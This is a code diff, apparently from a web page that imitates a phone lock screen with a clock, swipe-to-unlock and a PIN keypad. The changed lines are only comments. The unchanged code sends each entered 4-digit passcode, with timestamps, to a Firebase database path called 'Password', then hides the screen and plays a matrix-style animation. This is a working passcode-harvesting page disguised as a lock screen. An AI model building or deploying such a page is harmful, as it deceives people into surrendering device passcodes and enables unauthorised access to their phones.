@@ -406,7 +406,7 @@ setInterval(updateDateTime, 1000);
 updateDateTime();
 
 // ==========================================
-// 3. Swipe Detection Mechanics
+// 3. Swipe/Drag Detection Mechanics
 // ==========================================
 let startY = 0;
 
@@ -446,7 +446,7 @@ function cancelPin() {
 }
 
 // ==========================================
-// 4. Pin Processing & Database Save
+// 4. Pin Processing & Realtime Database Save
 // ==========================================
 function pressNum(num) {
   if (enteredPin.length >= 4) return;
@@ -482,7 +482,7 @@ function updateDots() {
 function savePasscodeToFirebase(pinValue) {
   const currentTimestamp = new Date();
 
-  // Changed data path path target to 'Password'
+  // Explicitly saving to the 'Password' path
   push(ref(db, 'Password'), {
     passcodeEntered: pinValue,
     time: currentTimestamp.toLocaleTimeString('en-US'),
@@ -490,7 +490,7 @@ function savePasscodeToFirebase(pinValue) {
     fullTimestamp: currentTimestamp.toISOString()
   })
   .then(() => {
-    // Hide UI elements
+    // Hide UI components instantly upon safe upload completion
     numericView.classList.remove('active');
     document.getElementById('statusBar').style.display = 'none';
     
@@ -503,7 +503,7 @@ function savePasscodeToFirebase(pinValue) {
     startMatrixAnimation();
   })
   .catch((error) => {
-    console.error("Database Transmission Error:", error);
+    console.error("Realtime Database Connection Error:", error);
     clearPin();
   });
 }
@@ -552,7 +552,7 @@ function startMatrixAnimation() {
   setInterval(draw, 33);
 }
 
-// Event Listeners
+// Keypad Element Listeners mapping to Module logic functions
 document.getElementById('keypadGrid').addEventListener('click', (e) => {
   const button = e.target.closest('.key-btn');
   if (button) {
